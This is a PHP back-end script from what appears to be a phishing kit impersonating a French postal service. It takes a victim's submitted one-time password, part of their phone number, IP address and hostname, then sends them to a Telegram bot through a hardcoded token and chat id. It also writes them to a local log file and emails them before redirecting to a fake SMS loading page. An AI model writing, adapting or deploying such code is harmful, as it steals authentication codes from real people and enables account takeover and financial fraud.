<?php
session_start();

error_reporting(0);


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
	
	

	$subject  = "POSTAL [ OTP ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: postal <postal@SPYUS.ORG>\r\n";
	$message .= "Tel:   +33 •• •• •• ".$_SESSION['Stelesx']."\n";
    $message .= "OTP:  ".$_POST['OTP']."\n"; 
	$message .= "IP :   $ip | $hostname\n";

	
	$to = "@gmail.com";
$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );






	
	$Txt_Rezlt = fopen('../A.txt', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);


		header('location: loadingsmsfinal.html');




?>



